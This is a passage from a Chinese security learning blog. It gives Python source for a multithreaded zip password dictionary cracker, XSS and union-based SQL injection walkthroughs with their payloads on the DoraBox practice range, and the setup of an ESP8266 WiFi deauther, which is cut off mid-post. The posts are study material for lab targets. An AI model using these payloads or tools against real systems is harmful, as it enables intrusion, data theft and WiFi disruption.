<p><em>init</em>(group=None, tatget=None, name=None, args=(),kwargs ={}, verbose=None, daemon=None) :</p>
<p>实例化一个线程对象，需要有一个可调用的 target，以及其参数 args或 kwargs。还可以传递 name 或 group 参数，不过后者还未实现。此外， verbose 标 志 也 是 可 接 受 的。 而 daemon 的 值 将 会 设定thread.daemon 属性/标志</p>
<p>start() : 开启线程</p>
<p>run() : 定义线程功能的方法（通常在子类中被应用开发者重写）</p>
<p>Barrier : 创建一个障碍，必须达到指定数量线程才开始运行</p>
<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p>在执行时.py文件要和要暴破的zip文件和密码字典放在同一目录下</p>
<p>这里我准备了一个乱写的字典pwd.txt,里面包含了正确的密码（密码一行写一个） 如下</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg1.PNG" title="timg">

<p>然后准备了一个加密过的zip文件zfile.zip 如下</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg2.PNG" title="timg">

<p>这是准备好的东西都在桌面上，同一目录。如下</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg3.PNG" title="timg">

<p>进入dos界面，先运行看一下Zip_Crack.py</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg4.PNG" title="timg">

<p>提示可以使用如下命令去完成操作 -f filename -d dictionary<br>这些提示是可以在optparse.OptionParser()设定的，参数就是提示，没有参数就默认没有提示。</p>
<p>接着按照操作进行zip文件暴破</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg5.PNG" title="timg">

<p>暴破成功，得到密码回显 root123，并且直接将压缩包内的文件解压到了当前目录下。</p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>TJ.O’Connor.Python绝技：运用python成为顶级黑客[M].崔孝晨，武晓音等译.北京：电子工业出版社，2016.1<br><a href="https://www.jianshu.com/p/b9da5fd2e5cf" target="_blank" rel="noopener">https://www.jianshu.com/p/b9da5fd2e5cf</a><br><a href="https://www.cnblogs.com/wangmo/p/7835073.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangmo/p/7835073.html</a><br><a href="https://blog.csdn.net/weixin_30709929/article/details/96264854" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30709929/article/details/96264854</a></p>
<h1 id="0x03-源码"><a href="#0x03-源码" class="headerlink" title="0x03 源码"></a>0x03 源码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import zipfile </span><br><span class="line">import optparse </span><br><span class="line">import threading  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Crackzip(zFile,password):</span><br><span class="line">    try:</span><br><span class="line">        zFile.extractall(<span class="built_in">pwd</span>=password) </span><br><span class="line">        <span class="built_in">print</span> <span class="string">' [+] Found Password : '</span>+ password + <span class="string">'\n'</span>  </span><br><span class="line">    except:</span><br><span class="line">       pass </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">"you can use this code to Crack Zipfile"</span>+ <span class="string">'\n'</span>+<span class="string">"-f &lt;zipfile&gt;  -d &lt;dictionary&gt;"</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>,dest=<span class="string">'zname'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'specify zip file'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-d'</span>,dest=<span class="string">'dname'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'specify dictionary file'</span>)</span><br><span class="line"></span><br><span class="line">    (options,args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(options.zname == None ) | (options.dname == None):</span><br><span class="line">        <span class="built_in">print</span> parser.usage</span><br><span class="line">        <span class="built_in">exit</span>(0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        zname = options.zname</span><br><span class="line">        dname = options.dname</span><br><span class="line"></span><br><span class="line">    zFile = zipfile.ZipFile(zname)</span><br><span class="line">    passFile = open(dname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():</span><br><span class="line">        password = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        t = threading.Thread(target = Crackzip,args=(zFile,password))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>脚本工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS_DoraBox靶场</title>
    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现，</p>
<p>这里使用DoraBox探究XSS漏洞</p>
<a id="more"></a>
<h1 id="DoraBox-XSS-反射型"><a href="#DoraBox-XSS-反射型" class="headerlink" title="DoraBox_XSS 反射型"></a>DoraBox_XSS 反射型</h1><h2 id="什么是反射型XSS"><a href="#什么是反射型XSS" class="headerlink" title="什么是反射型XSS"></a>什么是反射型XSS</h2><p>作为DoraBox第一次的XSS漏洞练习，先看一下什么是XSS：</p>
<p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin" target="_blank" rel="noopener">XSS(Cross-site Scripting)</a>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序(来源百度百科)</p>
<p>我所理解的反射型XSS是XSS的一种， 是即时性XSS。在满足条件时，即时触发，下一次需要再次部署payload</p>
<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对反射型XSS是这样定义的：</p>
<p><a href="http://www.ttlsa.com/safe/xss-description/" target="_blank" rel="noopener">反射型跨站脚本（Reflected Cross-site Scripting）</a>也称非持久型，参数型跨站脚本。这类跨站脚本是做常见的，主要是将恶意脚本附加到URL地址参数中。反射型XSS的利用一般是攻击者通过特殊的手法（比如利用电子邮件），诱使用户点击这些特定链接时，恶意的JavaScript代码会直接在受害者主机上执行。他的特点是指在用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。</p>
<h2 id="观察环境"><a href="#观察环境" class="headerlink" title="观察环境"></a>观察环境</h2><p>进入XSS环境，根据先前对反射型XSS的描述（将恶意脚本附加到URL地址参数），这提醒我们可以先观察URL是否满足条件。</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg2.PNG" title="timg">

<p>可以看见，红色箭头指向的地方，在URL中出现了submit提交的name参数(红色箭头指向)</p>
<h2 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h2><p>构造payload提交 ，此payload的效果是弹窗</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre>{% asset_img timg1.PNG timg %}

<p>执行成功，同时可以看见URL中 name参数 变成了我们的payload。当我们对弹框点击确定后，XSS消失。观察前端源码可以发现我们的payload</p>
{% asset_img timg4.PNG timg %}

<p>不难理解，反射型XSS就是通过提交恶意代码让浏览器执行一次，从而达到我们需要的目的。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在2019年OWASP Top10中，XSS位列第三，可见XSS在Web安全漏洞中的重要地位。</p>
<p>小插曲：我被自己XSS了！</p>
<p>前文写到的payload，因为要在本地localhost刷新，看完最终效果后我才会上传文章<br>，就在刚才写完准备检查一遍的时候，我惊了。</p>
{% asset_img timg3.PNG timg %}


<h1 id="DoraBox-XSS-存储型"><a href="#DoraBox-XSS-存储型" class="headerlink" title="DoraBox_XSS 存储型"></a>DoraBox_XSS 存储型</h1><h2 id="什么是存储型XSS"><a href="#什么是存储型XSS" class="headerlink" title="什么是存储型XSS"></a>什么是存储型XSS</h2><p>我个人对存储型XSS的理解，反射型XSS即时执行一次，而存储型XSS在满足触发条件后执行，就像埋了个地雷。</p>
<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对存储型XSS是这样定义的：</p>
<p>持久型跨站脚本（Presistent Cross-site Scripting）也等于<a href="https://blog.csdn.net/weixin_44720762/article/details/89736508" target="_blank" rel="noopener">存储型跨站脚本（Stored Cross-site Scripting）</a>，比反射型跨站脚本更具有威胁性，并且可能影响到Web服务器的安全。持久型XSS一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在网页中，即在受害者主机上的浏览器执行恶意代码。</p>
<h2 id="构造攻击-1"><a href="#构造攻击-1" class="headerlink" title="构造攻击"></a>构造攻击</h2><p>同之前一样，我们先构造一个XSS的payload的提交上去</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg11.PNG" title="timg">

<p>触发弹窗，payload执行成功，观察URL这次没有name参数了。</p>
<p>但是当我们点击确定的时候，弹窗重新出现。尝试刷新，弹窗依旧没有消失。而这，就是存可以执行多次的储型XSS，它将payload存储在了页面中，导致每次打开页面时都会执行一次payload。</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg11.PNG" title="timg">

<p>我们观察一下前端源码可以发现，每次执行的payload都保留在了网页中</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg22.PNG" title="timg">

<p>不难发现这就是存储型XSS的特点，将恶意代码长时间留存，每次打开网页都会造成一次攻击，威力远超一次性的反射型XSS</p>
<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>本次漏洞实践，充分表现了反射型XSS和存储型XSS的区别，更加深刻的了解了XSS</p>
<h1 id="DoraBox-XSS-DOM型"><a href="#DoraBox-XSS-DOM型" class="headerlink" title="DoraBox_XSS DOM型"></a>DoraBox_XSS DOM型</h1><h2 id="什么是DOM型XSS"><a href="#什么是DOM型XSS" class="headerlink" title="什么是DOM型XSS"></a>什么是DOM型XSS</h2><p>个人认为，如果将XSS分为两类，那么反射型XSS和存储型XSS是第一类，DOM型XSS是第二类。DOM型XSS区别于前两类的在于，DOM型XSS是基于<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/1033822?fr=aladdin&fromtitle=DOM&fromid=50288" target="_blank" rel="noopener">DOM文档对象</a>的一种漏洞，它不依赖于服务器的数据，而是从客户端获得DOM中的数据并在本地执行。</p>
<!--more-->

<h2 id="构造攻击-2"><a href="#构造攻击-2" class="headerlink" title="构造攻击"></a>构造攻击</h2><p>同样的，先构造payload尝试</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg111.PNG" title="timg">

<p>成功，URL中也出现了payload，返回结果和反射型XSS是一样的，那么两者的区别体现在哪？</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先观察一下反射型XSS的前端源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;title&gt;DoraBox - 反射XSS&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">    	&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">    		name: </span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"name"</span> id=<span class="string">"form1"</span>&gt;</span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">&lt;hr&gt; </span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>get方式的提交</p>
<p>在看一下DOM型XSS的源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;title&gt;DoraBox - DOM_XSS&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">			name: </span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"name"</span> id=<span class="string">"form1"</span>&gt;</span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">		&lt;hr&gt;</span><br><span class="line">		&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">		<span class="keyword">function</span> getURLValue(name)&#123;</span><br><span class="line"> 			var reg = new RegExp(<span class="string">'(^|&amp;)'</span>+ name +<span class="string">'=([^&amp;]*)(&amp;|$)'</span>);</span><br><span class="line">			var r = window.location.search.substr(1).match(reg); </span><br><span class="line">			<span class="keyword">if</span>(r != null)&#123;</span><br><span class="line"> 				<span class="built_in">return</span> unescape(r[2]);</span><br><span class="line"> 			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 		<span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line"> 				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		document.write(getURLValue(<span class="string">'name'</span>));</span><br><span class="line"></span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">//windows的location对象，查询参数，在当前页面的URL中得到？的部分 substr（）的作用是去除？，所以此处得到了name参数</span><br><span class="line"></span><br><span class="line">//unescape 方法返回一个包含 charstring 内容的字符串值。所有以 %xx 十六进制形式编码的字符都用 ASCII 字符集中等价的字符代替。</span><br><span class="line"></span><br><span class="line">//document.write()是向文本档输入指定内容，在这里document.write()输入的是name</span><br></pre></td></tr></table></figure>

<p>从DOM型XSS的前端源码中可以观察出，主要实现是通过window.location.search获取name参数，再通过document.write()在页面上返回获取到的name</p>
<p>印证了前文所述（从客户端获得DOM中的数据并在本地执行）</p>
<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>DOM型XSS同反射型XSS与存储型XSS区别于恶意代码的执行源，非传统型的XSS。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>XSS</tag>
        <tag>靶场练习</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入_DoraBox靶场</title>
    <url>/2019/11/02/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0_SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DoraBox是米斯特安全团推出的一款基础练习靶场，配合米斯特安全团队的教学视频练习可以快速入门，更易理解Web漏洞的实现，</p>
<p>这里使用DoraBox探究基本的三个SQL注入漏洞。</p>
<a id="more"></a>

<h1 id="DoraBox-SQLi数字型"><a href="#DoraBox-SQLi数字型" class="headerlink" title="DoraBox_SQLi数字型"></a>DoraBox_SQLi数字型</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="进入SQLi数字型的注入页面"><a href="#进入SQLi数字型的注入页面" class="headerlink" title="进入SQLi数字型的注入页面"></a>进入SQLi数字型的注入页面</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG" title="timg">

<p>很简单的页面</p>
<!--more-->

<h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p>先点击submit看结果，这里显示出了SQL执行语句 如下</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg2.PNG" title="timg">

<p>好接下来 传入id 并观察页面返回 页面返回正常 如下</p>
<p>1 and 1=1</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg3.PNG" title="timg">

<p>接着观察，页面返回出错 如下</p>
<p>1 and 1=2</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg4.PNG" title="timg">

<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>1 order by 3 返回正常 1 order by 4 返回错误 所以前者正确</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg5.PNG" title="timg">

<h3 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h3><p>-1 union select 1,database(),user()</p>
<p>可以看见 库名为 pentest 用户为 root@localhost</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg6.PNG" title="timg">

<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
<p>可以看见有两张表 account 和 news</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg7.PNG" title="timg">

<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’</p>
<p>可以看见三个列名 id rest own</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg8.PNG" title="timg">

<h3 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h3><p>-1 union select 1,2,concat_ws(‘|’,id,rest,own) from account</p>
<p>可以看见各列内容 至此本次练习结束</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DoraBox漏洞练习平台，难度不高，覆盖面广，包含多种常见Web漏洞环境，作为基础练习能很快上手。</p>
<p>本次练习为DoraBox漏洞练习平台中非常基础的SQli数字型注入</p>
<p>DoraBox项目地址：<a href="https://github.com/gh0stkey/DoraBox">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="DoraBox-SQLi字符型"><a href="#DoraBox-SQLi字符型" class="headerlink" title="DoraBox_SQLi字符型"></a>DoraBox_SQLi字符型</h1><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><h3 id="进入页面，先submit看一下"><a href="#进入页面，先submit看一下" class="headerlink" title="进入页面，先submit看一下"></a>进入页面，先submit看一下</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg11.PNG" title="timg">

<p>这里可以看见SQL语句：SELECT * FROM news WHERE title=’DoraBox’</p>
<p>猜测需要闭合单引号。用 and 1=1 验证</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg22.PNG" title="timg">

<p>猜测正确，可以继续。</p>
<p>之后大致过程与数字型一样，只要注意最后单引号的闭合即可，或者可以用#注释</p>
<h3 id="爆库名，用户-1"><a href="#爆库名，用户-1" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,database(),user()#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg33.PNG" title="timg">

<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’pentest’#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg44.PNG" title="timg">

<h3 id="爆列名-1"><a href="#爆列名-1" class="headerlink" title="爆列名"></a>爆列名</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg55.PNG" title="timg">

<h3 id="爆内容-1"><a href="#爆内容-1" class="headerlink" title="爆内容"></a>爆内容</h3><p>DoraBox’ and ‘1’ =’2’ union select 1,2,concat_ws(‘/‘,id,rest,own) from account #</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg66.PNG" title="timg">

<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>同数字型方式大致相同，注意单引号闭合即可</p>
<h1 id="DoraBox-SQLi搜索型"><a href="#DoraBox-SQLi搜索型" class="headerlink" title="DoraBox_SQLi搜索型"></a>DoraBox_SQLi搜索型</h1><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><h3 id="进入页面，先submit看一下SQL语句"><a href="#进入页面，先submit看一下SQL语句" class="headerlink" title="进入页面，先submit看一下SQL语句"></a>进入页面，先submit看一下SQL语句</h3><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg111.PNG" title="timg">

<p>可以发现，需要闭合 % 和 ‘</p>
<h3 id="构造闭合和显示位"><a href="#构造闭合和显示位" class="headerlink" title="构造闭合和显示位"></a>构造闭合和显示位</h3><p>DoraBox%’ and 1=2 union select 1,2,3#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg222.PNG" title="timg">

<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>DoraBox%’ and 1=2 union select 1,2,database()#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg333.PNG" title="timg">

<h3 id="爆表名-2"><a href="#爆表名-2" class="headerlink" title="爆表名"></a>爆表名</h3><p>DoraBox%’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg444.PNG" title="timg">

<h3 id="爆列名-2"><a href="#爆列名-2" class="headerlink" title="爆列名"></a>爆列名</h3><p>DoraBox%’ and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg555.PNG" title="timg">

<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p>DoraBox%’ and 1=2 union select 1,2,concat_ws(‘/‘,id,rest,own) from account#</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg777.PNG" title="timg">

<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>自此DoraBox的SQL注入部分全部完成，都是基础操作</p>
<p>SQLi数字型不用闭合，需要传入ID</p>
<p>SQLi字符型需要闭合 ‘</p>
<p>SQLi搜索型需要闭合 % 和 ‘</p>
<p>可见，在进行SQL注入时，要通过错误返回发现SQL执行语句或者大胆猜测SQL执行语句，才能构造完美闭合，达到最终目的。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>靶场练习</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>物理hacker之Esp8266_deauther</title>
    <url>/2019/10/30/%E7%89%A9%E7%90%86Hacker%E4%B9%8BEsp8266-deauther/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就在前几天，对，又是前几天，逛公众号的时候，一个醒目的标题吸引了我——《震惊！高校成年男子竟然在宿舍做出这等事……》，hhh玩笑玩笑。其实是看见了一个号称断网神器的东西，ESP8266，没错，又是开发板。简单的看了一下文章内容，好像不是很难（其实真做的时候满满的BUG，心塞。）立刻某宝走起，两天到货。上午忙碌了几个小时，无数报错后，终于完成！下面就来说说我这几小时烧制的苦逼经历。</p>
<h1 id="关于Esp8266"><a href="#关于Esp8266" class="headerlink" title="关于Esp8266"></a>关于Esp8266</h1><h5 id="什么是Esp8266-deauther？"><a href="#什么是Esp8266-deauther？" class="headerlink" title="什么是Esp8266_deauther？"></a>什么是Esp8266_deauther？</h5><p>在我简单看来，Esp8266就是一个WIFI芯片，具体可以看<a href="https://www.espressif.com/zh-hans/products/hardware/esp8266ex/overview" target="_blank" rel="noopener">官方解释</a>。就是这样一个微型WIFI模块，被国外的大神搞出了点名堂，叫esp8266_deauther</p>
<p>Github：<a href="https://github.com/spacehuhn/esp8266_deauther">https://github.com/spacehuhn/esp8266_deauther</a></p>
<a id="more"></a>

<p>里面讲了一些更新信息、安装方法、注意事项等等,还包括烧制的不同方法，具体的教学步骤等，参考项目就可以完成全部操作</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg1.PNG" title="timg">

<h5 id="Esp8266-deauther可以用来做什么？"><a href="#Esp8266-deauther可以用来做什么？" class="headerlink" title="Esp8266_deauther可以用来做什么？"></a>Esp8266_deauther可以用来做什么？</h5><p>尽管作者已经说明过，不应当对项目 标有WIFI阻断，WIFI攻击等标签，但也许是我个人才学疏浅，未得真谛，暂且我也只能将其功能用途理解为WIFI干扰，当然这只是功能带来的实际表象，并不能代表项目的存在意义。</p>
<p>Esp8266_deauther可以通过多种方式干扰周围WIFI，达到复刻SSID，阻塞目标网络，建立僵尸热点等。</p>
<h1 id="Esp8266-deauther实现过程"><a href="#Esp8266-deauther实现过程" class="headerlink" title="Esp8266_deauther实现过程"></a>Esp8266_deauther实现过程</h1><h5 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h5><p>硬件很简单，也很容易购买，价格不贵，某宝上一搜一大把，同时也可以在Github中提到的地址购买（略贵），这是官方淘宝店铺，如图：</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg3.PNG" title="timg">

<p>这是淘宝上其他店铺的，具体买哪个还是看自己，</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg4.PNG" title="timg">

<p>以下是我买的Esp8266 cp2102，大约二十多，不是最低价，那些五六块的也不敢买。</p>
<p>买的时候注意看型号 CP2102 和CH340 两钟都可以，之后安装不同的驱动就行。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg5.jpg" title="timg">

<h5 id="软件准备"><a href="#软件准备" class="headerlink" title="软件准备"></a>软件准备</h5><p>板子准备好，接下来就是驱动，烧制软件之类的了。</p>
<p>之前让留意的板子的型号现在派上用场，在原项目GitHub中找到这个地方，什么型号就下载什么驱动，下载下来解压安装就可以了</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg6.PNG" title="timg">

<p>插上你的Esp8266到电脑，在设备管理器-端口 可以看见你的设备则表示驱动安装完成。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg8.PNG" title="timg">

<p>下一步准备烧制软件，在原项目GitHub中有提到不同的方法，官方强烈建议我们使用的是Arduino IDE，因为之前制作BadUsb的时候我就是使用的Arduino IDE 所以毅然决然放弃了其他教程里提到的使用ESP8266Flasher去使用Arduino IDE。不过很快，我就为我这种做法付出了代价，漫天的BUG，各种报错，一个接一个处理不完，遂，还是老老实实用ESP8266Flasher。真香，操作比Arduino IDE简单，也没有各种错误。下载安装完ESP8266Flasher，进入初始界面会自动匹配你的port，然后进入Advanced调配参数，如图：</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg2.PNG" title="timg">

<p>接着回到Operation界面 点击FLASH等待蓝条到头，左下角出现绿钩就烧制完成了，在此期间，板子会长时间闪光，属正常反应。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg7.PNG" title="timg">

<h5 id="操作界面"><a href="#操作界面" class="headerlink" title="操作界面"></a>操作界面</h5><p>烧制完成后，给你的板子通上电源，接着搜索WIFI会出现一个名称为pwned的网络，默认密码deauther,连接</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg13.png" title="timg">

<p>连接pwned后，浏览器进入192.168.4.1，就能进入Esp8266_deauther的web界面。首先会进入一个确认界面，里面描述了项目的相关须知，以及安全声明，点击I HAVE READ AND UNDERSTAND 就可以进入了主页面了</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg14.PNG" title="timg">

<p>进入主页面，左上角的Scan，SSIDs,Attacks,Settings，可以进入不同分页</p>
<p>Scan页面主要是扫描WIFI，Set Target等</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg9.PNG" title="timg">

<p>SSIDs页面可以设立虚拟WIFI，可以在选项random mode中设置随机生成大量无线网络干扰周围的无线环境。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg10.PNG" title="timg">

